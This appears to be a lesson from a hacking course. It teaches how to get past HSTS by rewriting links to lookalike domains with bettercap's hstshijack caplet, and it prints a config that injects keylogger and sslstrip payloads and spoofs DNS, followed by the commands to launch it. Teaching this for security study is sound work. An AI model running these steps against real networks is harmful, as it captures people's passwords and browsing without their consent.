---
title: Bypassing HSTS
type: default
layout: page
---

In the previous lesson, we seen how to downgrade HTTPS websites to HTTP and this
allowed us to basically see anything an user does on these websites, because
data in HTTP is sent in plain text, therefore, we are able to see the usernames,
the passwords, the URLS and anything they do on HTTPS websites.

In the end of the previous lesson, I mentioned that the method shown won't work
in websites like Facebook Twitter and other websites that use HSTS.

The reason why it won't work against these websites, is because modern browsers
come with a list of websites that they should only load over HTTPS. What we were
doing on the previous lesson, whenever a browser requests a website, we load
that website even if it uses HTTPS, but we always give him back the HTTP
version. In HSTS, the browser knows that this website, for example,
_facebook.com_ should **ALWAYS** be loaded over HTTPS. So, even before sending
this request to us it will always send it in HTTPS and it will only accept it
if it comes back as HTTPS. There's nothing we can really do once we become the
man in the middle, because the browser is doing this check locally, it's
checking this against a list that is stored on the computer itself, therefore,
the only practical solution at the moment to bypass HSTS is to make the browser
think that it is loading another website, to do this, we are going to replace
all the HSTS links in loaded pages to similar links, for example:

* We can replace _facebook.com_ with _facebook.**corn**_. It seems very
suspicious, but when it goes into the URL bar, the _RN_ at the middle,
it will seem very similar to the _M_ letter.
* You can replace _twitter.com_ with _**twiter**.com_, but with a single
_T_ instead of a double _T_.

I know it might sound confusing, but let's do it practically so it becomes
more clear.

We are going to use the HSTS caplet again, the one that we used in the previous
lesson, but we are going to do a few modifications.

To modify the HSTS caplet, we have to open the .cap file at its location
(/usr/local/share/bettercap/caplets/hstshijack/hstshijack.cap) with the text
editor of your choice, you should see a file like the following:

```
# Documentation can be found at https://github.com/bettercap/caplets/tree/master/hstshijack

# Domains assigned to 'hstshijack.targets', 'hstshijack.blockscripts' and 'hstshijack.payloads'
# variables get precendence over those assigned to the 'hstshijack.ignore' variable.
set hstshijack.targets         *.google.com, google.com, gstatic.com, *.gstatic.com
set hstshijack.replacements    *.google.corn,google.corn,gstatic.corn,*.gstatic.corn
set hstshijack.ssl.domains     /usr/local/share/bettercap/caplets/hstshijack/domains.txt
set hstshijack.ssl.index       /usr/local/share/bettercap/caplets/hstshijack/index.json
set hstshijack.ssl.check       true
#set hstshijack.blockscripts    example.com,*.example.com
set hstshijack.obfuscate       true
set hstshijack.encode          true
set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
#set hstshijack.ignore          *

set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
http.proxy on

set dns.spoof.domains  *.google.corn,google.corn,gstatic.corn,*.gstatic.corn
set dns.spoof.all      true
dns.spoof on
```

The things that you want to understand and might change are the values of
_hstshijack.targets_ and _hstshijack.replacements_. The targets are the domains
that use HSTS and you want to replace, for example, one of its values are
_google.com_ and there is also _*.google.com_, basically when you use a star
it is a wildcard, it means that any subdomain **.google.com** is a target as
well. And _replacements_ is what you want to replace the targets with, for
example, whenever we see google.com we are going to replace it with
google.corn. You can also play with the _hstshijack.obfuscate_ and
_hstshijack.encode_ options, what they are going to do is to obfuscate and
encode the code, take in account that some browsers like Firefox
might block obfuscated or encoded code, so try switching values from
_true_ to _false_ and viceversa to see which one yields the best results for
you.

The values of _hstshijack.payloads_ you can set any other JavaScript code
that you want to inject, we will talk about javascript injection
in future lessons and finally, you want to make sure that the
DNS spoof domains are set exactly the same as the replacements set a few
lines up in the code.

If you modify this file, make sure to save, quit and restart BetterCAP.

Running this attack will be identical to what we did in the previous
lecture you just want to make sure to modify the _hstshijack.cap_ file
properly.

So just execute BetterCAP:

```bash
bettercap -iface enp1s0 -caplet ~/arp.cap
```

And run the _hstshijack_ caplet:

```bash
hstshijack/hstshijack
```
